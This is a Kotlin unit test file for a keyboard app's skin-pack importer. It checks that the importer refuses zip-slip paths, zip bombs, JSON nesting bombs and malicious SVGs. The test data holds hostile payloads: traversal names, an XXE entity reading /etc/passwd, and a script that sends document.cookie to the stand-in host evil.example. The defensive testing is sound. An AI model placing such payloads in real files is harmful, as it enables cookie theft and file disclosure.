package com.keyflow.skins

import com.google.common.truth.Truth.assertThat
import com.keyflow.skins.SkinPackTestFixtures.CountingStream
import com.keyflow.skins.SkinPackTestFixtures.MANIFEST
import com.keyflow.skins.SkinPackTestFixtures.orbOnly
import com.keyflow.skins.SkinPackTestFixtures.read
import com.keyflow.skins.SkinPackTestFixtures.svg
import com.keyflow.skins.SkinPackTestFixtures.zip
import com.keyflow.skins.SkinPackTestFixtures.zipWithZeros
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import org.junit.Test

/**
 * SKP-IMP-04, o requisito de segurança do import: zip-slip, zip bomb (contada em bytes LIDOS ao descomprimir, não no tamanho
 * que a entrada diz ter), JSON aninhado e o pacote malicioso completo. Tudo recusado sem instalar nada.
 */
class SkinPackSecurityTest {

    private fun refused(bytes: ByteArray): ImportReport {
        val result = read(bytes)
        assertThat(result).isInstanceOf(SkinPackReadResult.Failed::class.java)
        assertThat(result.report.installed).isEmpty()
        return result.report
    }

    // ── zip-slip ─────────────────────────────────────────────────────────────

    @Test
    fun `path traversal and absolute names refuse the whole pack`() {
        val evil = listOf(
            "../evil.svg",
            "..\\evil.svg",
            "/etc/passwd",
            "\\windows\\system32\\x.svg",
            "C:\\x\\orb_idle_01.svg",
            "c:/x/orb_idle_01.svg",
            "a/../../b.svg",
            "skin/../../manifest.json",
            "skin/./../../x",
            "..",
            "a/..",
            "a\\..\\..\\b",
        )
        for (name in evil) {
            val report = refused(zip(orbOnly(1) + listOf(name to svg().toByteArray())))
            assertThat(report.errors.single()).contains("caminho inseguro")
        }
    }

    @Test
    fun `control characters in a name are refused`() {
        for (name in listOf("orb_idle_01\u0000.svg", "a\u0001b.svg", "x\nmanifest.json", "del\u007F.svg")) {
            assertThat(refused(zip(orbOnly(1) + listOf(name to svg().toByteArray()))).errors.single()).contains("caminho inseguro")
        }
    }

    @Test
    fun `an unsafe name is refused even when it is hidden behind many valid files`() {
        val report = refused(zip(orbOnly(30) + listOf("x/../../../fora.svg" to svg().toByteArray())))
        assertThat(report.errors).hasSize(1)
    }

    @Test
    fun `dots inside a name are not traversal`() {
        // `a..b.svg` e `...` são nomes comuns; só o segmento `..` inteiro é travessia.
        val result = read(zip(orbOnly(1) + listOf("a..b.svg" to svg().toByteArray(), "...svg" to svg().toByteArray())))
        assertThat(result).isInstanceOf(SkinPackReadResult.Ok::class.java)
    }

    @Test
    fun `the error message never echoes control characters from the name`() {
        val report = refused(zip(orbOnly(1) + listOf("..\u0001/\u001b[31mfake.svg" to svg().toByteArray())))
        assertThat(report.errors.single().any { it.code < 0x20 }).isFalse()
    }

    // ── zip bomb ─────────────────────────────────────────────────────────────

    @Test
    fun `a bomb in a file nobody would use is stopped at 60 MB of inflated bytes`() {
        val bomb = zipWithZeros(orbOnly(1), listOf("lixo/enorme.bin" to 100))
        assertThat(bomb.size).isLessThan(1024 * 1024) // 100 MB de zeros cabem em menos de 1 MB: a bomba clássica
        val counting = CountingStream(bomb.inputStream())
        val result = SkinPackReader.read(counting)
        assertThat(result.report.errors.single()).contains("passa de 60 MB")
        assertThat(result.report.installed).isEmpty()
        // E parou cedo: não puxou o arquivo comprimido inteiro (a descompressão passou de 60 dos 100 MB, não dos 100).
        assertThat(counting.count).isLessThan(bomb.size.toLong())
    }

    @Test
    fun `the limit counts the total, not each file`() {
        val seven = (1..7).map { "lixo/$it.bin" to 10 } // 70 MB no total, 10 MB por arquivo
        assertThat(refused(zipWithZeros(orbOnly(1), seven)).errors.single()).contains("passa de 60 MB")
        val five = (1..5).map { "lixo/$it.bin" to 10 } // 50 MB: passa
        assertThat(read(zipWithZeros(orbOnly(1), five))).isInstanceOf(SkinPackReadResult.Ok::class.java)
    }

    @Test
    fun `a bomb dressed as a svg or as the manifest is stopped the same way`() {
        val asSvg = zipWithZeros(listOf("manifest.json" to MANIFEST.toByteArray()), listOf("orb_idle_01.svg" to 100))
        assertThat(refused(asSvg).errors.single()).contains("passa de 60 MB")
        val asManifest = zipWithZeros(listOf("orb_idle_01.svg" to svg().toByteArray()), listOf("manifest.json" to 100))
        assertThat(refused(asManifest).errors.single()).contains("passa de 60 MB")
    }

    @Test
    fun `the size an entry claims in its header is never trusted`() {
        // O cabeçalho local do `ZipOutputStream` (com descritor de dados) tem tamanhos zerados; aqui forçamos "1 byte" nos dois
        // campos, como um autor mal-intencionado faria. A leitura só conta o que sai da descompressão.
        val bomb = zipWithZeros(emptyList(), listOf("lixo.bin" to 80)).also { bytes ->
            // Cabeçalho local: assinatura(4) versão(2) flags(2) método(2) hora(2) data(2) crc(4) comprimido(4) original(4).
            for (field in listOf(18, 22)) {
                bytes[field] = 1
                bytes[field + 1] = 0
                bytes[field + 2] = 0
                bytes[field + 3] = 0
            }
        }
        assertThat(refused(bomb).errors.single()).contains("passa de 60 MB")
    }

    @Test
    fun `an svg over the per file limit does not keep the whole content in memory`() {
        // 30 MB de "SVG": o leitor marca estouro aos 512 KB e descarta o resto — o erro cita o arquivo, e a leitura segue até o fim.
        val big = ByteArray(30 * 1024 * 1024) { 'x'.code.toByte() }
        val report = refused(zip(listOf("manifest.json" to MANIFEST.toByteArray(), "orb_idle_01.svg" to big)))
        assertThat(report.errors.single()).isEqualTo("orb_idle_01.svg: o arquivo passa de 512 KB.")
    }

    @Test
    fun `a compressed zip over 25 MB is stopped while reading`() {
        val chunk = ByteArray(1024 * 1024).also { java.util.Random(3).nextBytes(it) }
        val out = ByteArrayOutputStream()
        ZipOutputStream(out).use { zip ->
            zip.setLevel(0)
            for (i in 0 until 27) {
                zip.putNextEntry(ZipEntry("lixo/$i.bin"))
                zip.write(chunk)
                zip.closeEntry()
            }
        }
        val counting = CountingStream(out.toByteArray().inputStream())
        val report = SkinPackReader.read(counting).report
        assertThat(report.errors.single()).contains("passa de 25 MB")
        assertThat(counting.count).isAtMost(26L * 1024 * 1024)
    }

    // ── json e svg ───────────────────────────────────────────────────────────

    @Test
    fun `a json nesting bomb in the manifest is an error, not a crash`() {
        val bomb = "[".repeat(30_000) + "]".repeat(30_000) // 60 000 bytes: cabe nos 64 KB do manifest
        val report = refused(zip(listOf("manifest.json" to bomb.toByteArray()) + listOf("orb_idle_01.svg" to svg().toByteArray())))
        assertThat(report.errors.single()).contains("aninhados")
    }

    @Test
    fun `a complete malicious pack is refused with every problem named and nothing installed`() {
        val entity = """<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>""" + svg(extra = "<text>&x;</text>")
        val entries = listOf(
            "manifest.json" to """{"schemaVersion":1,"name":"Maligna"}""".toByteArray(),
            "orb_idle_01.svg" to entity.toByteArray(),
            "orb_listening_01.svg" to svg(extra = "<script>fetch('http://evil.example/'+document.cookie)</script>").toByteArray(),
            "orb_paused_01.svg" to svg(extra = """<foreignObject><iframe src="http://evil.example"/></foreignObject>""").toByteArray(),
            "orb_transcribing_01.svg" to svg(extra = """<image href="http://evil.example/track.png" width="1" height="1"/>""").toByteArray(),
            "keyboard_key_normal.svg" to svg(extra = """<use xlink:href="file:///etc/shadow"/>""").toByteArray(),
        )
        val report = refused(zip(entries))
        assertThat(report.errors).hasSize(5)
        val text = report.errors.joinToString("\n")
        for (file in listOf("orb_idle_01.svg", "orb_listening_01.svg", "orb_paused_01.svg", "orb_transcribing_01.svg", "keyboard_key_normal.svg")) {
            assertThat(text).contains("$file:")
        }
    }

    @Test
    fun `an entity expansion attempt cannot slip through in a different case or spacing`() {
        for (head in listOf("<!DOCTYPE svg [", "<!doctype svg [", "<!  DOCTYPE svg [", "<!ENTITY lol \"x\">")) {
            val content = "$head<!ENTITY a \"b\">]>" + svg()
            val report = refused(zip(listOf("manifest.json" to MANIFEST.toByteArray(), "orb_idle_01.svg" to content.toByteArray())))
            assertThat(report.errors.single()).contains("DOCTYPE")
        }
    }
}
